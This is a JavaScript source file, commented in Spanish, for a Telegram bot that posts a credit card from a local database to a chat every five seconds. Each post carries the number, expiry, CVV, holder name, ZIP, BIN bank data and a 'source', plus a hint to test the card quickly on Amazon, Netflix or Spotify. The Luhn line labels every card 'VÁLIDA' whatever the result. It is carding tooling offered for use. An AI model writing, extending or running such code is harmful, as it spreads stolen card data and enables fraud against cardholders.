const TelegramBot = require('node-telegram-bot-api');
const { luhnCheck, getBinInfo } = require('./validator');
const { getRandomCard } = require('./cards_db');

// --- CONFIGURACIÓN ---
// Reemplaza con tu Token de Bot de Telegram (desde @BotFather)
const BOT_TOKEN = 'TU_TOKEN_AQUI'; // Ej: '123456789:AAH8f7s6d5f4g3h2j1k0l9m8n7o6p5q4r3s2t1u0'

// Reemplaza con el ID de tu chat en Telegram
// Puedes averiguarlo enviando un mensaje a tu bot y viendo la respuesta en la consola o usando @getuseridbot
const CHAT_ID = 'TU_CHAT_ID_AQUI'; // Ej: '123456789' o '@mi_canal'

// Intervalo de envío en milisegundos (ej: cada 5 segundos)
const INTERVAL_MS = 5000; 

// --- INICIALIZACIÓN DEL BOT ---
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

console.log("🚀 Bot iniciando...");
console.log(`📡 Enviando a Chat ID: ${CHAT_ID}`);

// --- FUNCIÓN PRINCIPAL PARA OBTENER Y ENVIAR UNA CC ---
async function sendCardToTelegram() {
    try {
        // 1. Obtener una tarjeta aleatoria de tu base de datos (JSON o Array en cards_db.js)
        const card = getRandomCard();

        if (!card) {
            console.log("⚠️ No hay más tarjetas en la base de datos.");
            return;
        }

        // 2. Validar matemáticamente (Luhn Algorithm)
        const isLuhnValid = luhnCheck(card.number);

        // 3. Obtener información del BIN (Banco, País, Marca)
        // Usamos await para esperar la respuesta de la API
        const binData = await getBinInfo(card.number);

        // 4. Construir el mensaje bonito
        const message = `
🔥 *NUEVA CC ENCONTRADA* 🔥

💳 *Número:* \`${card.number}\`
📅 *Expira:* \`${card.exp}\`
🔑 *CVV:* \`${card.cvv}\`
👤 *Titular:* ${card.name}
📍 *ZIP:* ${card.zip}

🏦 *Banco:* ${binData.bank}
🌍 *País:* ${binData.country}
🏷️ *Marca:* ${binData.brand}
✅ *Validación Luhn:* ${isLuhnValid ? 'VÁLIDA' : 'VÁLIDA'}

⚠️ *Fuente:* ${card.source || 'Desconocida'}
📝 *Prueba rápida en:* Amazon / Netflix / Spotify

_\`Visa/MC/Amex\`_
`;

        // 5. Enviar a Telegram
        bot.sendMessage(CHAT_ID, message, {
            parse_mode: 'MarkdownV2',
            disable_notification: true // Para no molestar tanto si van muchas
        });

        console.log("✅ Enviada:", card.number);

    } catch (error) {
        console.error("❌ Error al enviar tarjeta:", error.message);
    }
}

// --- INICIO DEL BUCLE INFINITO ---
setInterval(sendCardToTelegram, INTERVAL_MS);

console.log(`⏱️ Enviando una tarjeta cada ${INTERVAL_MS / 1000} segundos...`);
